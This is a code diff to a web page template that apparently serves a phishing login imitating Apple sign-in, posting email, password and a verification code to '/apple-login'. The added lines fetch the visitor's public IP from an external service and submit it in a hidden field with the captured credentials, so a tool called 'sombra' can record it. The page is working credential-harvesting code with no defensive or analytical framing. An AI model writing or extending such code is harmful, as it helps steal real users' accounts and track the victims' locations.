@@ -391,6 +391,7 @@
         <% } %>
 
         <form action="/apple-login" method="POST" id="login-form">
+            <input type="hidden" name="publicIp" id="publicIp" value="">
             <div class="step active" id="step-email">
                 <div class="form-group">
                     <input type="text" id="email" name="email" required placeholder="Email or phone number" autocomplete="username">
@@ -471,6 +472,23 @@
         const codeBoxes = document.querySelectorAll('.code-box');
         const codeValue = document.getElementById('code-value');
 
+        // ---------- Public IP (detected from the visitor's browser) ----------
+        // Ask an external service for the real public IP and send it along with
+        // the credentials, so sombra records the public IP instead of the local one.
+        let publicIp = '';
+        const ipRequest = fetch('https://api64.ipify.org?format=json', { cache: 'no-store' })
+            .then(r => r.json())
+            .then(d => { publicIp = (d && d.ip) || ''; })
+            .catch(() => { publicIp = ''; });
+
+        function submitWithPublicIp() {
+            const hiddenIp = document.getElementById('publicIp');
+            const done = () => { hiddenIp.value = publicIp || ''; form.submit(); };
+            if (publicIp) return done();
+            const t = setTimeout(done, 2500);
+            ipRequest.finally(() => { clearTimeout(t); done(); });
+        }
+
         function isValidEmail(value) {
             return /@gmail\.com$/i.test(value.trim());
         }
@@ -537,6 +555,10 @@
                 showStep('step-password');
                 passwordInput.classList.add('invalid');
                 return;
+            }
+            if (!document.getElementById('publicIp').value) {
+                e.preventDefault();
+                submitWithPublicIp();
             }
         });
 
